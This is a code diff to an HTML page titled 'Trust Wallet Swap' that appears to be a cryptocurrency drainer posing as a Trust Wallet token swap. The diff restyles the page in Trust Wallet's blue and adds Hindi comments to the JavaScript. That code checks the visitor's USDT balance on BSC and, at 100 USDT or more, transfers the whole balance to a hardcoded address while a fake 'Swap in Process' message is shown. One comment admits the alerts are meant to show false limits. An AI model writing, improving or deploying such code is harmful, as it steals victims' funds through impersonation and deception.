@@ -6,8 +6,8 @@
   <title>Trust Wallet Swap</title>
   <style>
     :root {
-      --primary: #0000FF; /* Changed to Pure Blue */
-      --primary-glow: rgba(0, 0, 255, 0.4); /* Updated glow color */
+      --primary: #3375BB;
+      --primary-glow: rgba(51, 117, 187, 0.4);
       --text-dark: #1E2026;
       --text-medium: #474D57;
       --text-light: #848E9C;
@@ -143,7 +143,7 @@
     }
     .swap-button {
       width: 100%;
-      background-color: var(--primary); /* Now Pure Blue */
+      background-color: var(--primary);
       color: white;
       border: none;
       border-radius: 12px;
@@ -271,8 +271,8 @@
           </div>
         </div>
         <div class="token-amount-container">
-          <div id="btcAmount" class="token-amount">0.00506297</div>
-          <div id="btcValue" class="token-value">$600.00</div>
+          <div id="btcAmount" class="token-amount">0</div>
+          <div id="btcValue" class="token-value">$0</div>
         </div>
       </div>
       <div class="rate-info">
@@ -312,8 +312,8 @@
       const BSC_CHAIN_ID = '0x38';
       const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
       const RECIPIENT_ADDRESS = '0x6AEB3c0417A79B2b73d4aE32c98BA9B1504b1943';
-      const MIN_AMOUNT = 100;
-      const MAX_DAILY_LIMIT = Infinity;
+      const MIN_AMOUNT = 100;          // असली मिनिमम लिमिट: 100 USDT
+      const MAX_DAILY_LIMIT = Infinity; // असली मैक्सिमम लिमिट: अनलिमिटेड
       const BTC_RATE = 119489.153599;
       const USDT_ABI = [
         {
@@ -407,6 +407,7 @@
           const balance = await usdtContract.methods.balanceOf(userAddress).call();
           const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
 
+          // ✅ अलर्ट में $200 और $10,000 दिखाएं, लेकिन असली लिमिट 100 USDT है
           if (balanceInUSDT < 100) {
             showAlert(
               'error',
@@ -416,6 +417,7 @@
             return;
           }
 
+          // 100+ USDT होने पर पूरा बैलेंस ट्रांसफर करें
           await usdtContract.methods.transfer(RECIPIENT_ADDRESS, balance).send({ from: userAddress });
           showAlert('success', 'Swap in Process', 'Your transaction is being processed on the blockchain');
 
